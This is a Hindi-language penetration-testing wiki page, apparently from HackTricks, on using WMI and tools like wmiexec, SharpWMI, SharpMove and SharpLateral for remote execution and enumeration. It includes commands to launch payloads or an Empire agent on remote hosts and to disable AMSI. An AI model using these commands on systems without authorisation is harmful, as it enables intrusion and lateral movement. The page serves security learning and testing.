# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## इसके काम करने की व्याख्या

WMI के उपयोग से उन hosts पर processes खोले जा सकते हैं जहाँ username और password या hash में से कोई एक ज्ञात हो। Wmiexec द्वारा WMI का उपयोग करके commands execute की जाती हैं, जिससे semi-interactive shell जैसा अनुभव मिलता है।

**dcomexec.py:** अलग-अलग DCOM endpoints का उपयोग करके, यह script `wmiexec.py` जैसी semi-interactive shell उपलब्ध कराती है। चुना गया `-object` value endpoint का चयन करता है; समर्थित objects में `MMC20.Application`, `ShellWindows`, और `ShellBrowserWindow` शामिल हैं। इनमें बाद वाला original walkthrough में highlight की गई Shell Browser Window technique उपलब्ध कराता है।<sup>[[2]](#references)[[3]](#references)</sup>

## WMI Fundamentals

### Namespace

Directory-style hierarchy में structured, WMI का top-level container \root है, जिसके अंतर्गत namespaces के रूप में संदर्भित अतिरिक्त directories व्यवस्थित की जाती हैं।<sup>[[1]](#references)</sup>
Namespaces की सूची बनाने के लिए commands:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Namespace के भीतर classes को इस प्रकार सूचीबद्ध किया जा सकता है:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Classes**

win32_process जैसे WMI class name और जिस namespace में वह मौजूद है, उसे जानना किसी भी WMI operation के लिए महत्वपूर्ण है।  
`win32` से शुरू होने वाले classes की सूची बनाने के लिए commands:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
किसी class का invocation:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Methods

WMI classes के एक या अधिक executable functions वाले Methods को execute किया जा सकता है।
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Service की स्थिति

WMI service operational है या नहीं, यह verify करने के लिए commands:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### सिस्टम और प्रोसेस की जानकारी

WMI के माध्यम से सिस्टम और प्रोसेस की जानकारी एकत्र करना:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
हमलावरों के लिए, WMI सिस्टम या domains के बारे में संवेदनशील डेटा एकत्र करने का एक शक्तिशाली tool है।<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Remote querying से WMI का उपयोग करके local admins या logged-on users जैसी specific information प्राप्त करना, सावधानीपूर्वक command construction के साथ संभव है।

### **Manual Remote WMI Querying**

किसी remote machine पर local admins और logged-on users की stealthy identification specific WMI queries के माध्यम से की जा सकती है। `wmic` एक साथ कई nodes पर commands execute करने के लिए text file से reading को भी support करता है।<sup>[[1]](#references)</sup>

WMI के माध्यम से किसी process को remotely execute करने के लिए, जैसे कि Empire agent deploy करना, निम्न command structure का उपयोग किया जाता है। Successful execution को return value "0" से indicate किया जाता है:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
यह प्रक्रिया WMI की remote execution और system enumeration की क्षमता को दर्शाती है, जो system administration और penetration testing दोनों के लिए इसकी उपयोगिता को उजागर करती है।

## स्वचालित Tools

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- आप **Impacket के `wmiexec`** का भी उपयोग कर सकते हैं।


## References

- [1] [Windows Boxes का स्वामित्व प्राप्त करने के लिए Credentials का उपयोग - भाग 3 (WMI और WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Impacket Tool Kit के लिए Beginners की Guide, भाग 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
